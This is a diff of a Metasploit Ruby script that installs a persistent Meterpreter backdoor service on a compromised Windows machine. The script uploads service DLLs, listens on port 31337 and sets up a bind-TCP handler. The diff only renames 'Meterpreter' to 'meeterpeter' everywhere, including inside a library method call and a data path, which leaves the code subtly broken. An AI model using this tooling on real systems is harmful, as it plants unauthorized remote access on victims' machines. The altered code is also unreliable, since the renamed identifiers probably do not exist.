@@ -1,5 +1,5 @@
 ##
-# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
+# WARNING: Metasploit no longer maintains or accepts meeterpeter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
@@ -7,7 +7,7 @@
 
 
 #
-# Meterpreter script for installing the meterpreter service
+# meeterpeter script for installing the meeterpeter service
 #
 
 session = client
@@ -17,7 +17,7 @@ session = client
 #
 opts = Rex::Parser::Arguments.new(
   "-h"  => [ false,  "This help menu"],
-  "-r"  => [ false,  "Uninstall an existing Meterpreter service (files must be deleted manually)"],
+  "-r"  => [ false,  "Uninstall an existing meeterpeter service (files must be deleted manually)"],
   "-A"  => [ false,  "Automatically start a matching exploit/multi/handler to connect to the service"]
 )
 
@@ -37,7 +37,7 @@ end
 # Default parameters
 #
 
-based    = File.join(Msf::Config.data_directory, "meterpreter")
+based    = File.join(Msf::Config.data_directory, "meeterpeter")
 rport    = 31337
 install  = false
 autoconn = false
@@ -64,9 +64,9 @@ if client.platform =~ /win32|win64/
   #
 
   if(not remove)
-    print_status("Creating a meterpreter service on port #{rport}")
+    print_status("Creating a meeterpeter service on port #{rport}")
   else
-    print_status("Removing the existing Meterpreter service")
+    print_status("Removing the existing meeterpeter service")
   end
 
   #
@@ -92,7 +92,7 @@ if client.platform =~ /win32|win64/
     to ||= from
     print_status(" >> Uploading #{from}...")
     fd = client.fs.file.new(tempdir + "\\" + to, "wb")
-    path = (from == 'metsrv.x86.dll') ? MetasploitPayloads.meterpreter_path('metsrv','x86.dll') : File.join(based, from)
+    path = (from == 'metsrv.x86.dll') ? MetasploitPayloads.meeterpeter_path('metsrv','x86.dll') : File.join(based, from)
     fd.write(::File.read(path, ::File.size(path)))
     fd.close
   end
@@ -120,7 +120,7 @@ if client.platform =~ /win32|win64/
   # Setup the exploit/multi/handler if requested
   #
   if(autoconn)
-    print_status("Trying to connect to the Meterpreter service at #{client.session_host}:#{rport}...")
+    print_status("Trying to connect to the meeterpeter service at #{client.session_host}:#{rport}...")
     mul = client.framework.exploits.create("multi/handler")
     mul.datastore['WORKSPACE'] = client.workspace
     mul.datastore['PAYLOAD'] = "windows/metsvc_bind_tcp"
@@ -134,6 +134,6 @@ if client.platform =~ /win32|win64/
   end
 
 else
-  print_error("This version of Meterpreter is not supported with this Script!")
+  print_error("This version of meeterpeter is not supported with this Script!")
   raise Rex::Script::Completed
 end
